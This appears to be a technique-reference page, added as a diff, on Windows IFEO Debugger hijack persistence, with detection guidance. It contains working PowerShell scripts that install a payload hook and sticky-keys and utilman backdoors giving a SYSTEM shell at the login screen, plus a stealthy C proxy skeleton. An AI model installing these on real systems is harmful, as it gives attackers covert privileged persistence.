@@ -1,0 +1,206 @@
+---
+title: IFEO Debugger Hijack
+mitre: T1546.012
+category: persistence
+group: Boot / Logon Autostart
+summary: Abuse the Image File Execution Options debugger key to intercept any process launch and silently substitute a malicious payload.
+platform: [Windows]
+tags: ['PowerShell', 'C / C++', 'Registry']
+updated: '2026-08-04'
+author: thehackersbrain
+readingTime: 6 min read
+callChain:
+  - call: write HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\<target.exe>\Debugger
+    desc: Set the Debugger value to the path of the payload; Windows will prepend this path to every launch of target.exe.
+    dll: advapi32
+  - call: user or system launches target.exe
+    desc: Windows passes the original target path as the first argument to the Debugger binary. The payload runs instead of (or before) the legitimate process.
+    dll: kernel32
+  - call: payload optionally launches the real binary
+    desc: To avoid detection, the payload re-executes the original command line so the user sees normal behaviour.
+    dll: kernel32
+detections:
+  - src: WINDOWS EID 4657
+    text: Registry value set under Image File Execution Options with a Debugger key pointing to a non-debugger path.
+  - src: SYSMON EID 12/13
+    text: Registry create or set event under IFEO key by a non-administrative or unexpected process.
+  - src: SYSMON EID 1
+    text: A process that has the expected image name in its command line but a different executable path (the payload was set as the debugger).
+  - src: BEHAVIOURAL
+    text: Common system processes (taskmgr.exe, sethc.exe, utilman.exe) spawning unexpected child processes.
+related:
+  - mitre: T1547.001
+    title: Registry Run Keys
+    desc: Simpler registry persistence that runs payloads at logon rather than on process launch.
+    href: /techniques/persistence/registry-run-keys
+  - mitre: T1546.003
+    title: WMI Event Subscription
+    desc: Event-driven persistence that does not require a specific process to be launched.
+    href: /techniques/persistence/wmi-event-subscription
+  - mitre: T1036.005
+    title: Masquerading
+    desc: Name the IFEO payload to match a system binary to reduce visibility in process listings.
+labKit:
+  - label: ifeo_set.ps1
+    href: 'https://github.com/thehackersbrain/maldev-lab-kit'
+  - label: Sigma rule pack
+    href: /detections
+---
+
+import Callout from '../../../components/Callout.astro';
+import CallChain from '../../../components/CallChain.astro';
+import CodeBlock from '../../../components/CodeBlock.astro';
+import DetectionGrid from '../../../components/DetectionGrid.astro';
+import RelatedList from '../../../components/RelatedList.astro';
+
+## Overview
+
+**Image File Execution Options (IFEO)** is a Windows registry feature designed to allow developers to attach a debugger to a process at launch. When a `Debugger` value is set under `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\<exe name>`, Windows prepends the debugger path to every invocation of that executable — the process loader calls the "debugger" with the original command line as its first argument.
+
+Adversaries abuse this for two purposes:
+1. **Persistence**: Set the Debugger key for a commonly launched system binary (e.g., `taskmgr.exe`, `notepad.exe`) so the payload runs every time that binary is launched.
+2. **Accessibility feature backdoor**: The classic "sticky keys" backdoor sets the Debugger key for `sethc.exe` (Sticky Keys, triggered with 5× Shift on the login screen) or `utilman.exe` (Accessibility menu on the login screen) to `cmd.exe`, gaining a SYSTEM shell before authentication.
+
+<Callout type="caution">
+  The accessibility feature backdoor (`sethc.exe → cmd.exe`) requires write access to HKLM,
+  which means Administrator or SYSTEM rights. This is typically used post-exploitation to establish
+  a SYSTEM-level persistence path that survives credential rotation — it does not bypass
+  authentication itself (the login screen is still shown; the backdoor fires via the accessibility
+  shortcut).
+</Callout>
+
+## The call chain
+
+<CallChain steps={frontmatter.callChain} />
+
+## Reference implementation
+
+### Set IFEO debugger via PowerShell
+
+<CodeBlock
+  file="ifeo_set.ps1"
+  label="PowerShell"
+  lang="powershell"
+  class="mb-7.5"
+  code={`# Persistence: every time taskmgr.exe launches, run payload.exe first
+$ifeo = "HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options"
+$target = "taskmgr.exe"
+$payload = "C:\\Windows\\Temp\\payload.exe"
+
+# Create the IFEO key if it doesn't exist
+New-Item -Path "$ifeo\\$target" -Force | Out-Null
+Set-ItemProperty -Path "$ifeo\\$target" -Name "Debugger" -Value $payload
+
+Write-Host "[+] IFEO hook set: $target -> $payload"
+
+# Verify
+Get-ItemProperty -Path "$ifeo\\$target"`}
+/>
+
+### Classic accessibility backdoor (SYSTEM shell at login screen)
+
+<CodeBlock
+  file="sticky_keys_backdoor.ps1"
+  label="PowerShell"
+  lang="powershell"
+  class="mb-7.5"
+  code={`# Requires SYSTEM or Administrator — classic domain pivoting technique
+# Trigger: press Shift 5 times at the Windows login screen
+$ifeo = "HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options"
+
+# Sticky Keys backdoor
+New-Item -Path "$ifeo\\sethc.exe" -Force | Out-Null
+Set-ItemProperty -Path "$ifeo\\sethc.exe" -Name "Debugger" -Value "C:\\Windows\\System32\\cmd.exe"
+
+# Utility Manager backdoor (Win+U at login screen)
+New-Item -Path "$ifeo\\utilman.exe" -Force | Out-Null
+Set-ItemProperty -Path "$ifeo\\utilman.exe" -Name "Debugger" -Value "C:\\Windows\\System32\\cmd.exe"
+
+Write-Host "[+] Accessibility backdoors installed"`}
+/>
+
+### Payload that transparently re-runs the original binary
+
+<CodeBlock
+  file="ifeo_proxy.c"
+  label="C"
+  lang="c"
+  class="mb-7.5"
+  code={`#include <windows.h>
+
+// This binary is set as the "Debugger" for target.exe.
+// argv[1] is the full path to target.exe; argv[2..] are the original arguments.
+// We run our payload, then re-launch the original binary so the user is unaware.
+
+int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {
+    // Payload: do malicious work here
+    // ...
+
+    // Reconstruct the original command line from GetCommandLine()
+    // Format: "C:\payload.exe" "C:\path\to\original.exe" [original args]
+    wchar_t *cmdline = GetCommandLineW();
+
+    // Skip past our own quoted path
+    wchar_t *p = cmdline;
+    if (*p == L'"') {
+        p++;
+        while (*p && *p != L'"') p++;
+        if (*p) p++;  // skip closing quote
+    } else {
+        while (*p && *p != L' ') p++;
+    }
+    while (*p == L' ') p++;  // skip spaces
+
+    // p now points to the original binary + its args
+    if (*p) {
+        STARTUPINFOW si = { .cb = sizeof si };
+        PROCESS_INFORMATION pi = {0};
+        CreateProcessW(NULL, p, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
+        CloseHandle(pi.hThread);
+        CloseHandle(pi.hProcess);
+    }
+
+    return 0;
+}`}
+/>
+
+## Well-known IFEO targets
+
+| Target exe | Trigger | Context |
+|---|---|---|
+| `sethc.exe` | Shift ×5 at login screen | SYSTEM shell before auth |
+| `utilman.exe` | Win+U at login screen | SYSTEM shell before auth |
+| `osk.exe` | On-Screen Keyboard at login | SYSTEM shell before auth |
+| `narrator.exe` | Narrator at login | SYSTEM shell before auth |
+| `taskmgr.exe` | Task Manager (Ctrl+Shift+Esc) | Runs on every invocation |
+| `notepad.exe` | Any text file open | Very common trigger |
+| `mspaint.exe` | PNG/BMP open | Common trigger |
+| `svchost.exe` | System service startup | Fires constantly — noisy |
+
+## Removing the hook (cleanup)
+
+<CodeBlock
+  file="ifeo_remove.ps1"
+  label="PowerShell"
+  lang="powershell"
+  class="mb-7.5"
+  code={`$ifeo = "HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options"
+
+# Remove the Debugger value only (preserves other IFEO settings for this exe)
+Remove-ItemProperty -Path "$ifeo\\taskmgr.exe" -Name "Debugger" -ErrorAction SilentlyContinue
+
+# Or remove the entire IFEO key for the target
+Remove-Item -Path "$ifeo\\taskmgr.exe" -Recurse -ErrorAction SilentlyContinue`}
+/>
+
+## Detection
+
+<DetectionGrid items={frontmatter.detections} />
+
+Monitoring IFEO registry writes should be table stakes in any SOC. The HKLM path requires admin rights, which limits who can set it — any modification from a non-administrative process is suspicious. From an administrative process, any Debugger value that points to a non-Microsoft-signed binary or a path in a writable user directory is a high-confidence indicator.
+
+Periodically auditing the IFEO keys for Debugger values (or `GFlags` silentprocessexit configurations) is a simple persistence-hunting query that catches this technique even without real-time alerting.
+
+## Variants & related
+
+<RelatedList items={frontmatter.related} />
